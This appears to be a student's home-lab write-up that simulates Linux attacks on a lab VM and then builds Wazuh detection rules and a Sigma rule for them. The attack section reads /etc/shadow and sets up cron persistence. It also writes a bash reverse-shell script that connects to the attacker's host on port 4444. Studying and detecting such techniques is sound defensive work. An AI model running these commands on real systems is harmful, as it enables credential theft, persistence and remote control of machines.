# **1.Attack Simulation** 
before starting the task : 
on wazuh :
```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```
on lubunto : 
```bash
sudo systemctl status auditd
sudo systemctl status wazuh-agent
sudo auditctl -l
sudo grep -a "Connected" /var/ossec/logs/osseclog | tail -5
```
on kali:
```bash
ping -c 3 192.168.2.128
```
## 1.1 Get SSH Access from Kali to LubuntuVM
on lubunto : 
```bash
sudo systemctl status ssh
```
on kali : 
```bash
ssh mariem@192.168.2.128
```
## 1.2 Attack A: Privilege Escalation Recon
```bash
whoami
id
uname -a
sudo -l
cat /etc/passwd
sudo cat /etc/shadow
find / -perm -4000 -type f 2>/dev/null
```
## 1.3 Attack B: Unauthorized Persistence via Cron
```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'whoami > tmp/attacker_was_here.txt'") | crontab -
crontab -l
echo '#!/bin/bash' > /tmp/malicious_backdoor.sh
echo 'bash -i >& /dev/tcp/192.168.2.192/4444 0>&1' >> /tmp/malicious_backdoor.sh
chmod +x /tmp/malicious_backdoor.sh
```
## 1.4 Attack C: Sensitive File Tampering
```bash
sudo cat /etc/sudoers
```
### Simulate attempting to add a backdoor user entry (we’ll just view, not actually corrupt)
```bash
sudo cat /etc/passwd | tail -5
```
### Touch /etc/passwd metadata (triggers your passwd-changes auditd rule)
```bash
sudo touch /etc/passwd
```
## 1.5 Confirm Telemetry is Flowing
```bash
sudo ausearch -k exec_commands | tail -20
sudo ausearch -k exec_changes | tail -20
```
# **2. Telemetry Analysis**
## 2.2 Filter By the Audit key
```bash
sudo ausearch -k passwd_changes --start recent
```
# **3.Custom Decoders & Rules**
## 3.2 Write Rule 1: Privilege Escalation Recon Detection
```xml
<group name="custom_attack,linux_recon,">
    <rule id="100002" level="12">
        <if_sid>92600</if_sid>
        <field name="audit.key">exec_commands</field>
        <field name="audit.exe" type="pcre2">/usr/bin/sudo|/usr/bin/whoami|/usr/bin/id</field>
        <description>Possible privilege escalation recon: suspicious command executed</description>
        <mitre>
            <id>T1548.003</id>
        </mitre>
    </rule>
</group>
```
## 3.3 Write Rule 2: Unauthorized Persistence Detection
```xml
<!-- Rule 2: Unauthorized persistence detection -->
<group name="custom_attack,linux_persistence,">
  <rule id="100003" level="12">
    <if_sid>92600</if_sid>
    <field name="audit.key">exec_commands</field>
    <field name="audit.exe" type="pcre2">\/usr\/bin\/crontab</field>
    <description>Unauthorized persistence attempt: crontab modification detected</description>
    <mitre>
      <id>T1053.003</id>
    </mitre>
  </rule>
</group>
```
## 3.4 Write Rule 3: Sensitive File Tampering Detection
```xml
<!-- Rule 3: Sensitive file tampering detection -->
<group name="custom_attack,linux_credential_access,">
  <rule id="100004" level="14">
    <if_sid>80700</if_sid>
    <field name="audit.key">passwd_changes</field>
    <description>Critical: Sensitive authentication file accessed or modified</description>
    <mitre>
      <id>T1003</id>
    </mitre>
  </rule>
</group>
```
## 3.5 Save and Restart Wazuh Manager
```bash
sudo systemctl restart wazuh-manager
sudo /var/ossec/bin/wazuh-analysisd -t 2>&1 | tail -20
```
## 3.6 Trigger and Verify Your Custom Rules 
```bash
sudo touch /etc/passwd
```
# **5.Bonus:Sigma Formatting
## 5.3 Map Your Wazuh Rule to Sigma Format
On wazuh server
```bash
sudo systemctl status wazuh-manager
```
On lubunto
```bash
sudo systemctl status wazuh-agent
sudo systemctl status auditd
sudo ausearch -k passwd_changes
```
### Verifying the Raw auditd Event Linked to Rule 100004
On wazuh server
```bash
uuidgen
```
## 5.4 Save the Sigma Rule as a File
On wazuh server
```bash
mkdir -p /home/mariem/sigma_rules
```
```yaml
title: Sensitive Authentication File Accessed or Modified
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects any access or modification to sensitive Linux authentication
  files such as /etc/passwd, /etc/shadow, or /etc/sudoers. This behavior
  is commonly associated with privilege escalation and credential access
  attacks.
author: Mariem
date: 2026/07/06
references:
  - https://attack.mitre.org/techniques/T1003/
tags:
  - attack.credential_access
  - attack.T1003
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: 'SYSCALL'
    key: 'passwd_changes'
    exe: '/usr/bin/touch'
  condition: selection
falsepositives:
  - System administrators performing legitimate maintenance
  - Package managers updating system files during upgrades
level: critical
```
```bash
cat /home/mariem/sigma_rules/sensitive_file_tampering.yml
```
## 5.5 Validate the Sigma Rule Format
On wazuh server
```bash
pip3 install sigma-cli
sigma check /home/mariem/sigma_rules/sensitive_file_tampering.yml
```















